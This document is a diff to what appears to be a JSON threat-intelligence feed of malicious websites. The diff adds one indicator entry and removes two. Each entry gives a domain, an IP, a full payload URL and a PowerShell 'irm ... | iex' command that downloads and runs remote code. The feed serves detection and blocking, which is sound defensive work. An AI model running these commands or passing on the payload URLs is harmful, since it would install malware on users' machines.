@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "wanderlustfestival.art",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "66.235.200.145"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/5d1090f58148ad0e",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/5d1090f58148ad0e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/5d1090f58148ad0e"
+    ],
+    "ReportId": "cmwrnhutd2q0j0omli5h8pu93",
+    "ScannedAt": "2026-11-22T09:44:55.684000+00:00"
+  },
+  {
     "UrlDomain": "hotshotssoccer.org",
     "DeliveryUrl": [
       "script.google.com",
@@ -3284,43 +3306,5 @@
     ],
     "ReportId": "cmwng8mio1wbu0oml0obq4vwk",
     "ScannedAt": "2026-11-19T11:10:43.018000+00:00"
-  },
-  {
-    "UrlDomain": "karat25.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/528af28445997174"
-    ],
-    "IP": [
-      "184.168.107.182"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/528af28445997174')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/528af28445997174"
-    ],
-    "ReportId": "cmwndcg261w1d0oml4mnk1sjd",
-    "ScannedAt": "2026-11-19T09:49:42.393000+00:00"
-  },
-  {
-    "UrlDomain": "www.insourcenet.co.za",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7b8d2ecd60505d"
-    ],
-    "IP": [
-      "41.204.202.6"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7b8d2ecd60505d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7b8d2ecd60505d"
-    ],
-    "ReportId": "cmwndbx891w080oml29yh3d48",
-    "ScannedAt": "2026-11-19T09:49:17.899000+00:00"
   }
 ]
